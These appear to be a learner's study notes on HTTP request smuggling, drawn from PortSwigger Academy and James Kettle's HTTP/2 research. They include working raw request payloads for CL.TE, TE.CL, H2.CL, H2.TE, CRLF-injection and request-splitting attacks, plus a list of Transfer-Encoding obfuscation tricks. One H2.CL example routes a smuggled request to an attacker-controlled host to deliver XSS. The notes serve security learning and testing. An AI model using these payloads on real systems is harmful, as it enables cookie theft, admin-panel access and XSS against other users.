# References:
- [Jarno Timmermarns playlist](https://www.youtube.com/playlist?list=PLGb2cDlBWRUX1_7RAIjRkZDYgAB3VbUSw)
- [Portswigger Academy - HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling#what-is-http-request-smuggling)
- Michael Sommer videos
# Extension
- HTTP Request Smuggler
# HTTP/1
- Who do we specify when a request ends? `Content-length:` or `Transfer-encoding:`
```html
b\r\n <- chunk size in hexadecimal
q=smuggling\r\n <- chunk content
0\r\n <- termination with a chunk of size zero
\r\n
```
- If both **Content-length** and **Transfer-encoding** are present, then the **Content-length header should be ignored**
- If two or more servers are chained together to process the requests, problems may arise
- Some servers do not support the Transfer-encoding header or some servers do not process the Transfer-encoding header if the header is obfuscated 
- If the servers behave differently processing the Transfer-encoding header, they might disagree about the boundaries between successive requests

- Nomenclature:
    - CL: Content-length
    - TE: Transfer-encoding
    - #1.#2: #1 the header the front-end server uses, #2 the header the back-end server 2 uses

- CL.TE
- TE.CL
- TE.TE: Even when both servers support TE, one of the servers can be induced to do not process it by obfuscating the header

# Reconnaissance - Determine the type
- HTTP/1.1
    - Bypass front-end security controls - access admin panel
    - Bypass front-end request rewriting - access admin panel
        - Look for requests that reflect the user's input
    - Capturing other users' requests - steal cookies
        - Look for requests that could be used to append and reflect other users' requests
    - Deliver XSS
        - Look for user reflected input (request headers, url parameters, etc)
    - TE.TE - Obfuscating the TE header
- Advanced
    - HTTP/2 downgrades
        - Response queue poisoning via H2.TE - Extract cookie
        - H2.CL request smuggling - Deliver XSS
        - HTTP/2 request smuggling via CRLF injection - steal cookies
        - HTTP/2 request splitting via CRLF injection - steal cookies
    - Browser-powered
        - CL.0 request smuggling - access admin panel

# Methodology
- Detect the type using the HTTP Smuggler Extension
    - HTTP/1.1
        CL.TE
        TE.CL
    - HTTP/2
    - Browser-powered
- Send two requests to the repeater tab to perform manual testing
    - Prepare one request to test for HTTP request smuggling exploitation paths manually
        - Downgrade HTTP protocol to HTTP/1.1(Skip this step is testing for HTTP/2 issues)
        - Change the request method to POST
        - Disable automatic update of Content-Length
        - Shown non-printable characters
        - Remove optional headers: Leave Content-Type and Content-Length
    - Use the second request as the "normal request" to simulate the victim's traffic
    - Make a request to a non-existent endpoint
        - Use the Customer-header or POST body parameter method to append the next request to it
    - Check for any validation being made
    - Check for any required bypasses needed
    - Craft an exploit

# Content-length vs Transfer-encoding: chunked byte count
- Content-length starts counting from the beginning of the body and it counts all \r\n bytes
- [Mozilla Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Length)
- [Security Exchange Example](https://security.stackexchange.com/questions/230609/calculate-content-length-http-request-smuggling)
- Transfer-encoding: chunked starts counting after the byte size declaration of the chunk and \r\n are not included in the count
- [Mozilla Example](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding)

# Test Payloads
```html
Content-Length: 6
Transfer-Encoding: chunked
\r\n
3\r\n
abc\r\n
X\r\n
```

```html
Content-Length: 6
Transfer-Encoding: chunked
\r\n
0\r\n
\r\n
X
```
![](/Images/requestSmugglingTests.png)
- CL.TE - Using custom header to append the next request to it
```html
POST / HTTP/1.1\r\n
Host: endpoint.com\r\n
Content-type: application/x-www-form-urlencoded\r\n
Content-Length: length-here\r\n
Transfer-Encoding: chunked\r\n
\r\n
3\r\n
abc\r\n
0\r\n
\r\n
GET /test/endpoint HTTP/1.1\r\n
Custom-test-header: x
```
- CL.TE - Using POST body parameter to append the next request to it: Ensure that the second `content-length` is long enough to append the content of the next request
- How much content of the next request should be appended? At least one byte; however, depending on whether or not data is trying to be extracted, the content-length should be set longer
- CL.TE - Sending a secondary request
```html
POST / HTTP/1.1\r\n
Host: endpoint.com\r\n
Content-type: application/x-www-form-urlencoded\r\n
Content-Length: length-on-auto-update\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
POST /test/endpoint HTTP/1.1\r\n
Host: localhost\r\n
Content-type: application/x-www-form-urlencoded\r\n
Content-Length: set-length-long-enough\r\n
\r\n
search=foobar
```
- TE.CL - Ensure the second content-length is long enough to add bytes from the next request
```html
POST / HTTP/1.1\r\n
Host: endpoint.com\r\n
Content-type: application/x-www-form-urlencoded\r\n
Content-Length: 4\r\n
Transfer-Encoding: chunked\r\n
\r\n
length-in-hex\r\n
GET /test/endpoint HTTP/1.1\r\n
Host: localhost\r\n
Content-Length: 6\r\n
\r\n
0\r\n
\r\n
```

# James Kettle presentation  HTTP/2: The Sequel Is Always Worse
- HTTP/1.1 is plain text, server parser is done with string operations
- HTTP/2 is binary protocol using key:value pairs
- HTTP/2 Uses Streams and StreamIDs. The browser uses the StreamID to know to which request to attach a specific response
- HTTP Downgrade is possible because front end servers rewrite the requests to HTTP/1.1 to talk to the backend server
- This dodges all the security benefits of using HTTP/2. This actually makes things worse and allows to issues such as H2.CL or H2.TE

- H2.CL: Zuul/Netty CVE-2021-21295 the content-length not being properly verified led to H2.CL Desync under the circumstance that it is being proxied through as HTTP/1.1

- H2.TE: "any message containing connection-specific header fields MUST be treated as malformed" failing to abide this generates a situation where H2.TE is possible

- H2.TE via Request Header Injection
- being a binary protocol, it allows you to put arbitrary characters wherever you like
- putting newlines (\r\n) in HTTP headers could lead to header injection

- H2.X via Request Splitting - Resp Queue Poisoning
- Sending a transfer-encoding header is not required. Smuggle two requests.
- After the downgrade, this will make the server lose track of what response belongs to what request and cause a serious issue
- H2.TE via header name injection
- H2.TE via request line injection

- Tunneling section starting at minute 22 has not been added to the notes

# HTTP/2 - HTTP Downgrading: Advanced request smuggling
- HTTP/2 messages are sent over the wire as a series of separate "frames". Each frame is preceded by an explicit length field, which tells the server exactly how many bytes to read
- The issue is that many web application perform HTTP/2 downgrading and this opens the door to more vulnerabilities
- Portswigger has documentation showing how to manipulate HTTP/2 requests using the inspector and explain what they mean by "Kettled requests" - [HTTP/2 Portswigger](https://portswigger.net/burp/documentation/desktop/http2)
## H2.CL Vulnerabilities
- Add the content-length header to the HTTP/2 request
- Test the server for lack of `content-length` header validation instead of enforcing the length specified by the HTTP/2 built-in mechanism
- Find a server redirect and chain it the HTTP Request Smuggling to deliver the XSS payload
```http
POST / HTTP/2
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /resources/js HTTP/1.1
Host: attacker-controlled.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
## H2.TE
```http
POST /example HTTP/2
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: bar
```
## Hidden HTTP/2 support
- To force Burp Repeater to use HTTP/2 so that you can test for this misconfiguration manually:
    1. From the Settings dialog, go to Tools > Repeater.
    2. Under Connections, enable the Allow HTTP/2 ALPN override option.
    3. In Repeater, go to the Inspector panel and expand the Request attributes section.
    4. Use the switch to set the Protocol to HTTP/2. Burp will now send all requests on this tab using HTTP/2, regardless of whether the server advertises support for this.
## H2.TE
- Use the Burp Inspector to add a `Transfer-Encoding: chunked` header
## Response Queue Poisoning
- Insert a whole request to poison the queue response and get other users' responses
- Remove the `Content-Type:` header and replace it with Transfer-Encoding
    - The backend server will use the TE after the HTTP/2 downgrade
- Use Burp intruder to speed up exploitation
    - Change the setting to avoid updating the content-length header
    - Use a custom resource pool
```http
POST / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
Content-Type: x-www-form-urlencoded\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /anything HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n
```
## Request smuggling via CRLF injection
- Insert the `Transfer-Encoding: chunked` header via a CRLF injection using Burp's Inspector. This will create a Kettled request
- Find a Request that reflects user input
```http
Foo: bar\nTransfer-Encoding: chunked
```
## HTTP/2 request splitting
- Similar to the Request smuggling via CRLF injection but instead of injecting a header, inject a new request
```http
Foo: bar\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: vulnerable-website.com
```
- This format will have to be changed depending on how the front-end rewrites the requests and how the headers are inserted
```http
Foo: bar\r\n
Host: vulnerable-website.com\r\n
\r\n
GET /admin HTTP/1.1
```
# Browser-powered request smuggling
## CL.0 request smuggling
- Back-end servers can sometimes be persuaded to ignore the Content-Length header, which effectively means they ignore the body of incoming requests
- This behavior for CL.0 can be found on endpoints that simply aren't expecting `POST` requests
- If the request's headers trigger an error, and the server issues an error response without consuming the request body off the socket. If the connection is not closed afterwards, this can provide an alternative CL.0 desync vector
- You can also try using GET requests with an obfuscated Content-Length header. If you're able to hide this from the back-end server but not the front-end, this also has the potential to cause a desync
### Good candidates for POST requests to test
- POST to a static file
- POST request to a server level redirect
- POST request that triggers a server side error
### Steps
- Create one tab containing the setup request and another containing an arbitrary follow-up request
- Change the requests to HTTP/1.1
- Add the two tabs to a group in the correct order
- Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection)
- Change the Connection header to `keep-alive`
- Enable HTTP/1.1 connection reuse
- Send the sequence and check the responses
### Header Obfuscation Techniques
```http
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```
